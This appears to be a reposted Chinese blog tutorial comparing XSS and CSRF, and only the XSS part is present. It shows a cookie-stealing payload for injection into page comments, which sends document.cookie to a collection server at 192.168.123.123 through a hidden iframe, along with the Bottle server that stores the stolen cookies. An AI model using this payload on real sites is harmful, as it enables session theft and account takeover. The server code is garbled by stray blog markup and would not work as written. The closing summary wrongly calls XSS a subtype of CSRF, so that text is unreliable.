---
title: ZT-XSS和CSRF对比
date: 2017-01-19 09:11:30
tags: 网络相关
---

<font color=grey>转载：https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</font>

## XSS：脚本中的不速之客

XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：
```javascript
while (true) {
    alert("你关不掉我~");
}
```
也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

"""

<!-- more -->


跨站脚本注入的信息收集服务器

"""javascript
import bottle

app = bottle.Bottle()
plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')
app.install(plugin)

@app.route('/myxss/')
def show(cookies, db):
    SQL = 'INSERT INTO "myxss" ("cookies") VALUES (?)'
    try:
        db.execute(SQL, cookies)
    except:
        pass
    return ""

if __name__ == "__main__":
    app.run()
```

然后在某一个页面的评论中注入这段代码：
```javascript
// 用 <script type="text/javascript"></script>  包起来放在评论中

(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```

<font color=red>个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>